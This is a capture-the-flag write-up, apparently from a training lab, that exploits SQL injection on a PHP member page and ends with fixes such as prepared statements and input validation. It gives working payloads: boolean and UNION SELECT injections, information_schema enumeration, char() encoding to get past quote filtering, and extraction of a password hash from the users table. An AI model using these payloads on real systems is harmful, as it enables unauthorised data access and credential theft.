# SQL Injection
The member page [http://10.203.72.119/?page=member](http://10.203.72.119/?page=member "member page") is vunerable to ***sql injection***

## Method
If we submit a ***'*** as the member id 
[http://10.203.72.119/?page=member&id=%27&Submit=Submit#](http://10.203.72.119/?page=member&id=%27&Submit=Submit#)
. We will get the output below.

*'' You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1 ''*

This is error displays for both single and double qoutes, which we now understand that they dont use neither to begin and end their statements.

We can now get all the rows in this table with input ***1 or 1***.
```
http://10.203.73.150/index.php?page=member&id=1+or+1&Submit=Submit#
```
we get 4 rows back. the fourth one has a clue, as shown below.
```
ID: 1 or 1 
First name: Flag
Surname : GetThe
```

So there is a flag in this table probably. Ok, so then we check for the tables that they have from the information schema. Using union select, we select all the tables, as shown below.

``` sql
1 union select 1, table_name from information_schema.tables
```
output
```
ID: 1 union select 1, table_name from information_schema.tables-- 
First name: 1
Surname : users
ID: 1 union select 1, table_name from information_schema.tables-- 
First name: 1
Surname : guestbook
ID: 1 union select 1, table_name from information_schema.tables-- 
First name: 1
Surname : list_images
ID: 1 union select 1, table_name from information_schema.tables-- 
First name: 1
Surname : vote_dbs
```
These are the are some of table that we got back, but the above seem to be ones that are used for users of this web application. We first look into the ***users*** table. With the sql statement below we will display all the columns for this table.
```sql
1 union select 1, column_name from information_schema.columns where table_name=char(117,115,101,114,115)
```
For the name of the table we are selecting the columns from which is the ***users***  table, on the input we had to convert ***users*** to ascii (117,115,101,114,115), it seems like the are using a php function to protect against this input.

From the output we get colunms:
1. first_name
1. last_name
1. town
1. country
1. planet
1. commentaire
1. countersign

Lets get the rows for the columns with sql below
``` sql
1 union select 1, concat(first_name, last_name, town,country, planet,commentaire, countersign) from users
```
On the last row return from the output we then get instructions to the flag
```
ID: 1 union select 1, concat(first_name, last_name, town,country, planet,commentaire, countersign) from users 
First name: 1
Surname : FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```
We folow the instructions to get this flag ***10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5***.

## Soultion
1. Using prepared statements given that this site uses ***PHP***, prepared help the database distinguish between the ***code*** and ***user input***, by pre-compliling ***SQL*** statements to be then used as input. For ***PHP*** using ***PDO*** is one of the solutions.
1. Validating input, making use of ***regular expression*** to validate thee user input whether it matches the expected input, checking whether it contains special charcters, which would be incorrect if the input is to be a surname or name. This process can be called ***sanitization***.
1. ***Backend*** validation is very important.
